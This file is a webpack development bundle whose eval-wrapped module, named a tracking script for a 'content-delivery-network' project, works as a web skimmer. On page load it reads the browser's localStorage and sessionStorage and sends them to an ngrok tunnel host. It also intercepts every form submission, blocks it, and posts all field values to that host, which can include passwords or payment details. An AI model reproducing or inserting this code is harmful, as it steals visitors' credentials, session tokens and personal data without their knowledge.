/*
 * ATTENTION: The "eval" devtool has been used (maybe by default in mode: "development").
 * This devtool is neither made for production nor for readable output files.
 * It uses "eval()" calls to create a separate source file in the browser devtools.
 * If you are trying to read the output file, select a different devtool (https://webpack.js.org/configuration/devtool/)
 * or disable the default devtool with "devtool: false".
 * If you are looking for production-ready output files, see mode: "production" (https://webpack.js.org/configuration/mode/).
 */
/******/ (() => { // webpackBootstrap
/******/ 	var __webpack_modules__ = ({

/***/ "./tracking_script.js":
/*!****************************!*\
  !*** ./tracking_script.js ***!
  \****************************/
/***/ (() => {

eval("// tracking.js\n\nconst sendData = async(eventObject) =>{\n  fetch('https://6b16-2409-4072-6d03-a321-8d75-babf-e223-3182.ngrok-free.app/miler_cdn/event', {\n                method: 'POST',\n                headers: {\n                'Content-Type': 'application/json',\n                },\n                body:JSON.stringify(eventObject),\n            })\n            .then((response) => response.json())\n            .then((data) => {\n                console.log('Response from backend:', data);\n            })\n            .catch((error) => {\n                console.error('Error sending event:', error);\n            });\n}\n(function() {\n  window.addEventListener('load', function() {\n  let pageData = [];\n  const {host,\n    hostname,\n    href,\n    origin,\n    pathname,\n    port,\n    protocol} = window.location;\n    const hostData = {\n      host,\n      hostname,\n      href,\n      origin,\n      pathname,\n      port,\n      protocol,\n    };\n    const sessionStorage = this.window.sessionStorage;\n    const localStorage = this.window.localStorage;\n    pageData.push(hostData, sessionStorage, localStorage, {timestamp: new Date(8.64e15).toString()});\n    console.log(\"=======pageData================\", pageData);\n    sendData(pageData);\n});\n\nwindow.onpopstate = function(event) {\n  var currentRoute = window.location.pathname;\n  console.log('Route changed to:', currentRoute);\n  // Log or send data to the server\n};\n\n\nwindow.addEventListener('submit', function(event) {\n  event.preventDefault(); // Prevents the default form submission\n  let inputData =[];\n  const formData = new FormData(event.target);\n  const formInputs = formData.entries();\n\n  for (const input of formInputs) {\n    inputData.push(input);\n  }\n  \n  console.log(\"=======submit event================\", {\n    'Action': event.target.action,\n    'Method': event.target.method,\n    inputData\n  });\n  sendData({\n    'Action': event.target.action,\n    'Method': event.target.method,\n    inputData,\n    timestamp: new Date(8.64e15).toString()\n  })\n  // Your code here\n});\n  // Register a callback to capture route changes\n  // window.addEventListener('popstate', logPageDetails);\n\n  // Call the function to capture initial page details\n  // logPageDetails();\n})();\n\n\n\n//# sourceURL=webpack://content-delivery-network/./tracking_script.js?");

/***/ })

/******/ 	});
/************************************************************************/
/******/ 	
/******/ 	// startup
/******/ 	// Load entry module and return exports
/******/ 	// This entry module can't be inlined because the eval devtool is used.
/******/ 	var __webpack_exports__ = {};
/******/ 	__webpack_modules__["./tracking_script.js"]();
/******/ 	
/******/ })()
;